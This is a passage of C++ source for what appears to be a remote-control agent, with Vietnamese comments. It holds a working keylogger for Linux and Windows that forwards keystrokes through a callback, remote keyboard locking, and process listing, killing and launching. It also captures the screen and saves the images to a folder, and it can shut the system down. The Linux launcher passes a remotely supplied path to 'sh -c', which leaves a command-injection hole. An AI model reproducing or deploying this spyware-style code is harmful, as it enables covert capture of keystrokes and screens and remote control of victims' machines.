            // 2. Logic UNLOCK KHẨN CẤP: Ctrl + Alt + U
            if (g_isLocked && is_pressed && (ev.code == KEY_U)) {
                if (g_ctrl_pressed && g_alt_pressed) {
                    KeyManager::set_locked(false);
                    std::cout << "[KEYBOARD] EMERGENCY UNLOCK TRIGGERED!\n";
                    continue;
                }
            }

            // 3. Xử lý Callback (Gửi phím)
            if (is_pressed && g_keyMap.count(ev.code)) {
                std::string key = g_keyMap[ev.code];
                
                // Nếu đang giữ Shift và là chữ cái -> Viết hoa (Logic đơn giản)
                // (Thực tế cần xử lý phức tạp hơn nhưng tạm thời thế này là đủ demo)
                /* // Logic viết hoa đơn giản (Optional)
                if (key.length() == 1 && key[0] >= 'a' && key[0] <= 'z') {
                   // check shift state...
                }
                */

                if (g_callback) {
                    g_callback(key);
                }
            }
        }
    }

    // Dọn dẹp
    if (g_fd != -1) {
        // Đảm bảo mở khóa trước khi đóng file, tránh làm tê liệt bàn phím vĩnh viễn
        ioctl(g_fd, EVIOCGRAB, 0); 
        close(g_fd);
        g_fd = -1;
    }
    std::cout << "[KEYBOARD] Loop finished.\n";
}

// ============================================================
// IMPLEMENT CLASS KEYMANAGER
// ============================================================

const std::string& KeyManager::get_module_name() const { 
    static const std::string name = "KEYBOARD"; 
    return name; 
}

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

void KeyManager::set_locked(bool locked) {
    g_isLocked = locked;
    if (g_fd != -1) {
        // EVIOCGRAB: 1 = Grab (Khóa, chỉ mình tôi nghe), 0 = Ungrab (Mở)
        int result = ioctl(g_fd, EVIOCGRAB, locked ? 1 : 0);
        if (result == 0) {
            std::cout << "[KEYBOARD] Lock state changed to: " << (locked ? "LOCKED" : "UNLOCKED") << "\n";
        } else {
            std::cerr << "[KEYBOARD] Failed to change lock state. (Are you Root?)\n";
        }
    }
}

void KeyManager::start_hook() {
    if (g_running) return;
    
    // Reset trạng thái
    g_running = true;
    g_isLocked = false;
    g_ctrl_pressed = false;
    g_alt_pressed = false;
    
    hookThread = std::thread(hook_loop);
    hookThread.detach(); 
}

void KeyManager::stop_hook() {
    if (!g_running) return;

    g_running = false;
    g_isLocked = false; // Luôn mở khóa khi stop để tránh mất bàn phím

    // Đóng file descriptor sẽ khiến hàm read() trong thread đang chờ bị ngắt và thoát vòng lặp
    if (g_fd != -1) {
        ioctl(g_fd, EVIOCGRAB, 0); // Ungrab trước khi đóng
        close(g_fd);
        g_fd = -1;
    }
}

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");
    
    if (command == "START") {
        start_hook();
        return {
            {"status", "success"}, 
            {"message", "Keylogger started"}
        };
    }
    else if (command == "STOP") {
        stop_hook();
        return {
            {"status", "success"}, 
            {"message", "Keylogger stopped"}
        };
    }
    // Lệnh LOCK
    else if (command == "LOCK") {
        if (!g_running) start_hook(); // Phải start thì mới có fd để Grab
        // Chờ 1 chút để fd được mở nếu vừa start
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        
        set_locked(true);
        return {
            {"status", "success"}, 
            {"message", "Keyboard LOCKED (Ctrl+Alt+U to unlock)"}
        };
    }
    // Lệnh UNLOCK
    else if (command == "UNLOCK") {
        set_locked(false);
        return {
            {"status", "success"}, 
            {"message", "Keyboard UNLOCKED"}
        };
    }

    return {
        {"status", "error"}, 
        {"message", "Unknown command"}
    };
}


/* ===== FILE: ./src/modules/KeyManager_win.cpp ===== */

// KeyManager_win.cpp
#include "KeyManager.hpp"
#include <iostream>
#include <vector>

// --- BIẾN TOÀN CỤC (BẮT BUỘC ĐỂ HOOK HOẠT ĐỘNG) ---
static HHOOK g_hHook = NULL;
static KeyCallback g_callback = nullptr; // Hàm callback để gửi dữ liệu ra ngoài
static bool g_isLocked = false; // [MỚI] Biến trạng thái khóa

// --- HÀM TIỆN ÍCH: CHUYỂN ĐỔI VK_CODE SANG STRING (CÓ XỬ LÝ SHIFT/CAPS) ---
static std::string ConvertVKCodeToString(DWORD vkCode) {
    // 1. Xử lý các phím đặc biệt để dễ đọc log
    if (vkCode == VK_RETURN) return "[ENTER]\n";
    if (vkCode == VK_BACK)   return "[BACKSPACE]";
    if (vkCode == VK_TAB)    return "[TAB]";
    if (vkCode == VK_SPACE)  return " ";
    if (vkCode == VK_ESCAPE) return "[ESC]";
    if (vkCode >= VK_F1 && vkCode <= VK_F12) return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    if (vkCode == VK_CAPITAL) return "[CAPS]";
    if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) return "[CTRL]";
    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) return "[SHIFT]";
    if (vkCode == VK_LMENU || vkCode == VK_RMENU) return "[ALT]"; // VK_MENU là ALT
    
    // Bỏ qua các phím điều hướng (Arrow keys, Insert, Delete, Home, End, PageUp/Down)
    if ((vkCode >= VK_PRIOR && vkCode <= VK_DOWN) || vkCode == VK_INSERT || vkCode == VK_DELETE) return ""; 

    // 2. Lấy trạng thái bàn phím (để biết có đang bật CapsLock hay giữ Shift không)
    std::vector<BYTE> keyState(256);
    // Cần gọi GetKeyboardState trước để ToUnicodeEx hoạt động chính xác
    if (!GetKeyboardState(keyState.data())) return "";

    // 3. Dùng ToUnicodeEx để chuyển đổi chính xác
    WCHAR buffer[16] = {0};
    HKL keyboardLayout = GetKeyboardLayout(0);

    int result = ToUnicodeEx(
        vkCode,
        MapVirtualKey(vkCode, MAPVK_VK_TO_VSC),
        keyState.data(),
        buffer,
        _countof(buffer),
        0,
        keyboardLayout
    );

    // 4. Nếu chuyển đổi thành công -> Chuyển sang UTF-8 string
    if (result > 0) {
        std::wstring ws(buffer);
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    return "";
}

// --- HOOK PROCEDURE (CẬP NHẬT: CHẶN TOÀN DIỆN) ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Chỉ xử lý khi nCode >= 0 (theo tài liệu MS)
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = pKeyBoard->vkCode;

        // 1. NẾU ĐANG Ở TRẠNG THÁI KHÓA
        if (g_isLocked) {
            // Kiểm tra xem có phải tổ hợp cứu hộ: CTRL + ALT + U không?
            // (Kiểm tra trạng thái bất đồng bộ của phím vật lý)
            bool isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            bool isAlt  = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

            // Chỉ check unlock khi có sự kiện nhấn phím (WM_KEYDOWN hoặc WM_SYSKEYDOWN)
            if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                 if (isCtrl && isAlt && (vk == 'U' || vk == 'u')) {
                    g_isLocked = false;
                    std::cout << "[KEYBOARD] EMERGENCY UNLOCK TRIGGERED!\n";
                    return 1; // Nuốt phím U để không gõ ra màn hình
                }
            }

            // CHẶN TẤT CẢ: Bao gồm KeyDown, KeyUp, SysKeyDown (Alt), SysKeyUp
            // Trả về 1 để Windows không xử lý phím này nữa.
            return 1; 
        }

        // 2. NẾU KHÔNG KHÓA -> CHẠY KEYLOGGER
        // Chỉ log khi nhấn xuống (WM_KEYDOWN) để tránh log kép
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyChar = ConvertVKCodeToString(vk);
            if (!keyChar.empty() && g_callback) {
                g_callback(keyChar);
            }
        }
    }
    
    // Chuyển tiếp cho ứng dụng khác nếu không chặn
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

/// ============================================================
// IMPLEMENT CLASS KEYMANAGER
// ============================================================

const std::string& KeyManager::get_module_name() const {
    static const std::string name = "KEYBOARD";
    return name;
}

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

void KeyManager::set_locked(bool locked) {
    g_isLocked = locked;
    std::cout << "[KEYBOARD] Lock state: " << (locked ? "LOCKED" : "UNLOCKED") << std::endl;
}

void KeyManager::start_hook() {
    if (g_hHook != NULL) return; // Đã chạy rồi thì thôi

    // Hook cần vòng lặp message (Message Loop) riêng, nên phải chạy trong thread mới
    hookThread = std::thread([]() {
        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        
        MSG msg;
        // Vòng lặp giữ thread sống để lắng nghe sự kiện
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        // Khi vòng lặp kết thúc (thường khó xảy ra trừ khi PostQuitMessage), dọn dẹp
        if (g_hHook) {
            UnhookWindowsHookEx(g_hHook);
            g_hHook = NULL;
        }
    });
    hookThread.detach(); // Tách thread để nó chạy ngầm
    std::cout << "[KEYBOARD] Hook started.\n";
}

void KeyManager::stop_hook() {
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
        g_isLocked = false;
        std::cout << "[KEYBOARD] Hook stopped.\n";
    }
    // Lưu ý: Thread cũ vẫn có thể đang treo ở GetMessage, 
    // nhưng Unhook sẽ làm nó ngừng nhận phím. 
    // Trong thực tế production cần gửi WM_QUIT tới thread ID để đóng thread sạch sẽ.
}

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");

    if (command == "START") {
        start_hook();
        return {{"status", "success"}, {"message", "Keylogger started"}};
    }
    else if (command == "STOP") {
        stop_hook();
        return {{"status", "success"}, {"message", "Keylogger stopped"}};
    }
    else if (command == "LOCK") {
        // Nếu chưa hook thì phải hook mới lock được
        if (g_hHook == NULL) start_hook();
        set_locked(true);
        return {{"status", "success"}, {"message", "Keyboard LOCKED (Ctrl+Alt+U to unlock)"}};
    }
    else if (command == "UNLOCK") {
        set_locked(false);
        return {{"status", "success"}, {"message", "Keyboard UNLOCKED"}};
    }

    return {{"status", "error"}, {"message", "Unknown command"}};
}


/* ===== FILE: ./src/modules/ProcessManager.hpp ===== */

#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <string>
#include <iostream>
#include <nlohmann/json.hpp>
#include <fstream>

#if _WIN32
#include <windows.h>
#include <tlhelp32.h>
#else
#include <signal.h>
#include <wait.h>
#include <unistd.h>
#include <sys/types.h>
#include <cstdlib>
#include <dirent.h>
#endif

using json = nlohmann::json;

class ProcessManager : public IRemoteModule {
public:
    const std::string& get_module_name() const override;
    json handle_command(const json& request) override;

private:
    json list_processes();
    bool kill_process(int pid);
    
    // [MỚI] Hàm khởi tạo tiến trình trả về PID
    bool start_process(const std::string& path, int& out_pid);
};



/* ===== FILE: ./src/modules/ProcessManager_linux.cpp ===== */

#include "ProcessManager.hpp"

const std::string& ProcessManager::get_module_name() const {
    static const std::string name = "PROCESS";
    return name;
}

json ProcessManager::handle_command(const json& request) {
    std::string cmd = request.value("command", "");

    // --- 1. LIST ---
    if (cmd == "LIST") {
        return list_processes();
    }
    
    // --- 2. KILL ---
    else if (cmd == "KILL") {
        int pid = 0;
        if (request.contains("payload") && request["payload"].contains("pid")) {
            pid = request["payload"]["pid"].get<int>();
        } else if (request.contains("pid")) {
            pid = request.value("pid", 0);
        }

        if (pid > 0 && kill_process(pid)) {
            return {
                {"status", "success"},
                {"module", get_module_name()},
                {"command", "KILL"},
                {"pid", pid},
                {"data", "Process terminated"}
            };
        } else {
            return {
                {"status", "error"}, 
                {"module", get_module_name()},
                {"error", "Failed to kill process"}};
        }
    }

    // --- 3. START (MỚI) ---
    else if (cmd == "START") {
        std::string path;
        // Lấy đường dẫn từ payload
        if (request.contains("payload") && request["payload"].contains("path")) {
            path = request["payload"]["path"].get<std::string>();
        } 
        // Fallback
        else if (request.contains("path")) {
            path = request.value("path", "");
        }

        if (path.empty()) {
            return {
                {"status", "error"}, 
                {"module", get_module_name()},
                {"error", "Missing 'path' in payload"}};
        }

        int new_pid = 0;
        if (start_process(path, new_pid)) {
            return {
                {"status", "success"},
                {"module", "PROCESS"},
                {"command", "START"},
                {"pid", new_pid},
                {"data", "Process started successfully"}
            };
        } else {
            return {
                {"status", "error"}, 
                {"module", get_module_name()},
                {"error", "Failed to create process. Check path."}
            };
        }
    }

    return {
        {"status", "error"}, 
        {"module", get_module_name()},
        {"error", "Unknown command"}
    };
}

json ProcessManager::list_processes() {
    json process_list = json::array();

    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        return {
            {"status", "error"},
            {"module", get_module_name()},
            {"command", "LIST"},
            {"message", "Could not open /proc directory"}
        };
    }

    struct dirent* entry;
    while ((entry = readdir(proc_dir)) != NULL) {
        
        if (entry->d_type != DT_DIR) {
            continue;
        }

        const char* d_name = entry->d_name;
        bool is_pid = true;
        if (*d_name == '\0') is_pid = false; // Tên rỗng

        while (*d_name) {
            if (!std::isdigit(*d_name)) {
                is_pid = false;
                break;
            }
            d_name++;
        }

        if (is_pid) {
            std::string pid_str(entry->d_name);
            unsigned long pid = 0;
            unsigned long threads = 0;
            std::string name;

            try {
                pid = std::stoul(pid_str);
            } catch (...) {
                continue; // Bỏ qua nếu không phải số hợp lệ
            }

            std::ifstream comm_file("/proc/" + pid_str + "/comm");
            if (comm_file.is_open()) {
                std::getline(comm_file, name);
            } else {
                continue; 
            }

            std::ifstream status_file("/proc/" + pid_str + "/status");
            std::string line;
            if (status_file.is_open()) {
                while (std::getline(status_file, line)) {
                    if (line.rfind("Threads:", 0) == 0) {
                        std::stringstream ss(line);
                        std::string key; // Đọc chữ "Threads:"
                        ss >> key >> threads; // Đọc số lượng luồng
                        break;
                    }
                }
            }
            process_list.push_back({
                {"pid",     pid},
                {"name",    name}, 
                {"threads", threads}
            });
        }
    }

    closedir(proc_dir);

    return {
        {"status", "success"},
        {"module", get_module_name()}, 
        {"command", "LIST"},
        {"data", process_list}
    };
}

bool ProcessManager::start_process(const std::string& path, int& out_pid) {
    int pipe_fd[2];
    if (pipe(pipe_fd) == -1) 
        return false;

    pid_t pid = fork();

    if (pid == -1) {
        close(pipe_fd[0]);
        close(pipe_fd[1]);
        return false;
    }

    if (pid == 0) {
        // --- TIẾN TRÌNH CON ---
        
        // 1. Chuyển stdout sang đầu 'write' của pipe
        close(pipe_fd[0]); // Con không đọc, đóng đầu đọc
        dup2(pipe_fd[1], STDOUT_FILENO); // Chuyển hướng stdout
        close(pipe_fd[1]); // Đóng fd gốc

        // 2. Chạy lệnh wrapper
        // Ví dụ: "alacritty & echo $!"
        std::string command = path + " & echo $!";
        
        execl("/bin/sh", "sh", "-c", command.c_str(), (char*) NULL);
        
        // Nếu execl thất bại
        _exit(errno); 
    }

    // --- TIẾN TRÌNH CHA ---
    close(pipe_fd[1]); // Cha không viết, đóng đầu viết

    int status;
    waitpid(pid, &status, 0); 

    std::array<char, 32> buffer;
    std::string real_pid_str;
    ssize_t bytes_read = read(pipe_fd[0], buffer.data(), buffer.size() - 1);
    
    close(pipe_fd[0]); // Đọc xong, đóng đầu đọc

    unsigned long real_pid = 0;

    if (bytes_read > 0) {
        buffer[bytes_read] = '\0'; // Đảm bảo kết thúc chuỗi
        real_pid_str = buffer.data();
        
        // Xóa ký tự newline '\n' ở cuối
        real_pid_str.erase(
            std::remove(real_pid_str.begin(), real_pid_str.end(), '\n'), 
            real_pid_str.end()
        );

        try {
            real_pid = std::stoul(real_pid_str);
        } catch (...) {
             return false; 
        }
    } else {
         return false;
    }

    out_pid = real_pid;
    return true;
}

bool ProcessManager::kill_process(int pid_ul) {
    pid_t pid = static_cast<pid_t>(pid_ul);

    const pid_t self = getpid();
    if (pid == self) {
        return false;
    }

    // if (kill(pid, 0) == -1) {
    //     return false;
    // }

    if (kill(pid, SIGKILL) == 0) {
        return true;
    }

    return false;
}    
     
     
     
     



/* ===== FILE: ./src/modules/ProcessManager_win.cpp ===== */

#include "ProcessManager.hpp"
#include <iostream>

const std::string& ProcessManager::get_module_name() const {
    static const std::string name = "PROCESS";
    return name;
}

json ProcessManager::handle_command(const json& request) {
    std::string cmd = request.value("command", "");

    // --- 1. LIST ---
    if (cmd == "LIST") {
        return list_processes();
    }
    
    // --- 2. KILL ---
    else if (cmd == "KILL") {
        int pid = 0;
        if (request.contains("payload") && request["payload"].contains("pid")) {
            pid = request["payload"]["pid"].get<int>();
        } else if (request.contains("pid")) {
            pid = request.value("pid", 0);
        }

        if (pid > 0 && kill_process(pid)) {
            return {
                {"module", "PROCESS"},
                {"command", "KILL"},
                {"status", "success"},
                {"pid", pid},
                {"message", "Process terminated"}
            };
        } else {
            return {{"status", "error"}, {"message", "Failed to kill process"}};
        }
    }

    // --- 3. START (MỚI) ---
    else if (cmd == "START") {
        std::string path;
        // Lấy đường dẫn từ payload
        if (request.contains("payload") && request["payload"].contains("path")) {
            path = request["payload"]["path"].get<std::string>();
        } 
        // Fallback
        else if (request.contains("path")) {
            path = request.value("path", "");
        }

        if (path.empty()) {
            return {{"status", "error"}, {"message", "Missing 'path' in payload"}};
        }

        int new_pid = 0;
        if (start_process(path, new_pid)) {
            return {
                {"module", "PROCESS"},
                {"command", "START"},
                {"status", "success"},
                {"pid", new_pid},
                {"message", "Process started successfully"}
            };
        } else {
            return {{"status", "error"}, {"message", "Failed to create process. Check path."}};
        }
    }

    return {{"status", "error"}, {"message", "Unknown command"}};
}

// ... (Hàm list_processes giữ nguyên) ...
json ProcessManager::list_processes() {
    json process_list = json::array();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return {{"status", "error"}};

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            process_list.push_back({
                {"pid", (int)pe32.th32ProcessID},
                {"name", std::string(pe32.szExeFile)},
                {"threads", (int)pe32.cntThreads}
            });
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return {{"module", "PROCESS"}, {"command", "LIST"}, {"status", "success"}, {"data", {{"process_list", process_list}}}};
}

// ... (Hàm kill_process giữ nguyên) ...
bool ProcessManager::kill_process(int pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) return false;
    bool res = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return res;
}

// [MỚI] Cài đặt hàm Start Process
bool ProcessManager::start_process(const std::string& path, int& out_pid) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // CreateProcess yêu cầu chuỗi command line có thể ghi được (mutable), nên ta copy ra buffer
    std::vector<char> cmdData(path.begin(), path.end());
    cmdData.push_back('\0');

    // API tạo tiến trình
    if (CreateProcessA(
        NULL,           // No module name (use command line)
        cmdData.data(), // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure
    )) {
        out_pid = (int)pi.dwProcessId;
        
        // Quan trọng: Đóng handle để tránh rò rỉ bộ nhớ (Process vẫn chạy bình thường)
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    
    return false;
}



/* ===== FILE: ./src/modules/ScreenManager.hpp ===== */

#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <vector>
#include <string>

// --- CẤU HÌNH CHO WINDOWS ---
#if defined(_WIN32)
    #include <windows.h>
    #include <objidl.h> 
    #include <gdiplus.h> // Thường cần thêm cái này cho chụp ảnh màn hình Windows

// --- CẤU HÌNH CHO LINUX ---
#elif defined(__linux__)
    #include <X11/Xlib.h>
    #include <X11/Xutil.h>
    #include <jpeglib.h>
    #include <iostream>
    #include <cstring>
#endif
class ScreenManager : public IRemoteModule {
public:
    const std::string& get_module_name() const override { 
        static const std::string name = "SCREEN"; return name; 
    }
    
    json handle_command(const json& request) override;

    // Hàm public để Main gọi trực tiếp
    //static bool capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg);
    static bool capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg, bool save_to_disk = true); // Mặc định là lưu vào ổ đĩa, còn khi streaming thì không lưu
};



/* ===== FILE: ./src/modules/ScreenManager_linux.cpp ===== */

#include "ScreenManager.hpp"

json ScreenManager::handle_command(const json& request) {
    // Chúng ta sẽ xử lý capture binary ở main.cpp để truy cập socket trực tiếp
    // Hàm này chỉ trả về OK để báo hiệu nếu cần.
    return { {"status", "ok"} };
}

bool ScreenManager::capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg, bool save_to_disk) {
    error_msg.clear();

    // 1. Kết nối với X Server
    Display* display = XOpenDisplay(NULL);
    if (!display) {
        error_msg = "Cannot open X Display";
        return false;
    }

    Window root = DefaultRootWindow(display);
    
    // Lấy thông số màn hình
    XWindowAttributes attributes;
    XGetWindowAttributes(display, root, &attributes);
    int width = attributes.width;
    int height = attributes.height;

    // 2. Chụp màn hình
    XImage* img = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
    if (!img) {
        error_msg = "XGetImage failed";
        XCloseDisplay(display);
        return false;
    }

    // 3. Chuẩn bị dữ liệu RGB để nén
    // X11 thường trả về BGRA, libjpeg cần RGB. Ta phải convert thủ công.
    std::vector<uint8_t> rgb_data;
    rgb_data.resize(width * height * 3);

    for (int y = 0; y < height; y++) {
        for (int x = 0; x < width; x++) {
            unsigned long pixel = XGetPixel(img, x, y);
            
            // Tách màu dựa trên Mask của XImage (để an toàn với mọi loại màn hình)
            uint8_t r = (pixel & img->red_mask) >> 16;  // Thường shift 16
            uint8_t g = (pixel & img->green_mask) >> 8; // Thường shift 8
            uint8_t b = (pixel & img->blue_mask);       // Thường shift 0
            
            // Nếu mask không đúng chuẩn (ví dụ màn hình BGR), code trên cần chỉnh lại shift
            
            int index = (y * width + x) * 3;
            rgb_data[index] = r;
            rgb_data[index + 1] = g;
            rgb_data[index + 2] = b;
        }
    }

    // 4. Nén sang JPEG bằng libjpeg
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;

    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);

    // Cấu hình output vào bộ nhớ (Memory Buffer) thay vì File
    // out_buffer sẽ tự động được resize bởi libjpeg
    unsigned char* mem_buffer = NULL;
    unsigned long mem_size = 0;
    jpeg_mem_dest(&cinfo, &mem_buffer, &mem_size); 

    // Cấu hình thông số ảnh
    cinfo.image_width = width;
    cinfo.image_height = height;
    cinfo.input_components = 3; // RGB
    cinfo.in_color_space = JCS_RGB;

    jpeg_set_defaults(&cinfo);
    
    // Đặt chất lượng nén (Quality = 60)
    jpeg_set_quality(&cinfo, 60, TRUE);

    // Bắt đầu nén
    jpeg_start_compress(&cinfo, TRUE);

    int row_stride = width * 3;
    while (cinfo.next_scanline < cinfo.image_height) {
        // Ghi từng dòng
        JSAMPROW row_pointer[1];
        row_pointer[0] = &rgb_data[cinfo.next_scanline * row_stride];
        jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }

    jpeg_finish_compress(&cinfo);
    
    // 5. Copy dữ liệu từ buffer của libjpeg sang vector output
    out_buffer.assign(mem_buffer, mem_buffer + mem_size);

    // --- Lưu file JPEG ra ổ đĩa ---
    FILE* fp = fopen("screenshot.jpg", "wb");
    if (fp) {
        fwrite(out_buffer.data(), 1, out_buffer.size(), fp);
        fclose(fp);
    } else {
        error_msg = "Cannot write screenshot.jpg";
        // Bạn có thể return false tùy nhu cầu
    }

    // Dọn dẹp libjpeg
    if (mem_buffer) free(mem_buffer); // jpeg_mem_dest cấp phát bằng malloc
    jpeg_destroy_compress(&cinfo);

    // Dọn dẹp X11
    XDestroyImage(img); // Hàm này tự free memory của img
    XCloseDisplay(display);

    return true;
}



/* ===== FILE: ./src/modules/ScreenManager_win.cpp ===== */

#include "ScreenManager.hpp"

// [FIX] Thêm thư viện này để định nghĩa IStream cho GDI+
// Bắt buộc phải có nếu dự án dùng WIN32_LEAN_AND_MEAN

#include <gdiplus.h>
#include <vector>
#include <memory>
#include <iostream>
#include <fstream>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <direct.h> // Để tạo thư mục (_mkdir)
// Link thư viện GDI+ (Chỉ hoạt động với MSVC, nếu dùng MinGW cần thêm trong CMakeLists.txt)
#pragma comment (lib,"Gdiplus.lib")

using namespace Gdiplus;

// Helper để lấy Encoder ID cho JPEG
static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0; UINT  size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    auto pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}
// Hàm khởi tạo/hủy GDI+ (Singleton đơn giản)
struct GdiPlusInit {
    ULONG_PTR gdiplusToken;
    GdiPlusInit() { GdiplusStartupInput g; GdiplusStartup(&gdiplusToken, &g, NULL); }
    ~GdiPlusInit() { GdiplusShutdown(gdiplusToken); }
};
static GdiPlusInit init;

static void SaveDataToDisk(const std::vector<uint8_t>& data, const std::string& prefix) {
    // 1. Tạo thư mục logs nếu chưa có
    _mkdir("captured_data");
    
    // 2. Tạo tên file theo thời gian: captured_data/screen_20231208_103001.jpg
    auto t = std::time(nullptr);
    auto tm = *std::localtime(&t);
    
    std::ostringstream oss;
    oss << "captured_data/" << prefix << "_" 
        << std::put_time(&tm, "%Y%m%d_%H%M%S") << ".jpg";
    
    std::string filename = oss.str();

    // 3. Ghi file
    std::ofstream file(filename, std::ios::binary);
    if (file.is_open()) {
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        file.close();
        std::cout << "[STORAGE] Saved: " << filename << std::endl;
    }
}

// === CAPTURE SCREEN TO JPEG BUFFER ===
// === CAPTURE SCREEN ===
bool ScreenManager::capture_screen_data(std::vector<uint8_t>& out_buffer, std::string& error_msg, bool save_to_disk) {
    error_msg.clear();
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);

    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
        error_msg = "BitBlt failed";
        return false;
    }

    Bitmap* bitmap = Bitmap::FromHBITMAP(hBitmap, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) {
        delete bitmap; return false;
    }

    CLSID jpgClsid;
    GetEncoderClsid(L"image/jpeg", &jpgClsid);
    EncoderParameters encoderParameters;
    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParameters.Parameter[0].NumberOfValues = 1;
    ULONG quality = 60; 
    encoderParameters.Parameter[0].Value = &quality;

    Status stat = bitmap->Save(stream, &jpgClsid, &encoderParameters);
    
    if (stat == Ok) {
        STATSTG stg;
        stream->Stat(&stg, STATFLAG_NONAME);
        ULONG streamSize = stg.cbSize.LowPart;
        out_buffer.resize(streamSize);
        LARGE_INTEGER seekPos; seekPos.QuadPart = 0;
        stream->Seek(seekPos, STREAM_SEEK_SET, NULL);
        ULONG bytesRead;
        stream->Read(out_buffer.data(), streamSize, &bytesRead);

        if (save_to_disk) { // Chỉ lưu khi biến này true
            SaveDataToDisk(out_buffer, "screen");
        }
    } else {
        error_msg = "GDI+ Save Failed";
    }

    stream->Release();
    delete bitmap;
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return (stat == Ok);
}

json ScreenManager::handle_command(const json& request) {
    return { {"status", "ok"} };
}


/* ===== FILE: ./src/modules/SystemManager.hpp ===== */

// src/modules/ProcessManager.hpp
#pragma once
#include "../interfaces/IRemoteModule.hpp"
#include <string>

#if _WIN32
#include <windows.h> // Cho các kiểu dữ liệu Windows
#else
#include <thread>
#include <iostream>
#endif

class SystemManager : public IRemoteModule {
private:
    std::string module_name_ = "SYSTEM";
    
    // Các hàm thực thi Windows API (Triển khai trong .cpp)
    json shutdown_system() const;
    json restart_system() const;
    
public:
    SystemManager() = default;
    const std::string& get_module_name() const override { return module_name_; }
    json handle_command(const json& request) override; // Định nghĩa trong .cpp
};



/* ===== FILE: ./src/modules/SystemManager_linux.cpp ===== */

#include "SystemManager.hpp"

void wrapper_shutdown() {
    std::this_thread::sleep_for(std::chrono::seconds(5));
    int t = system("nohup systemctl poweroff");
}

void wrapper_restart() {
    std::this_thread::sleep_for(std::chrono::seconds(5));
    int t = system("nohup systemctl reboot");
}

json SystemManager::shutdown_system() const {
    int can_shutdown = system("systemctl --dry-run poweroff > /dev/null 2>&1");
    json res = {
        {"status", "success"},
        {"module", get_module_name()},
        {"command", "SHUTDOWN"}
    };

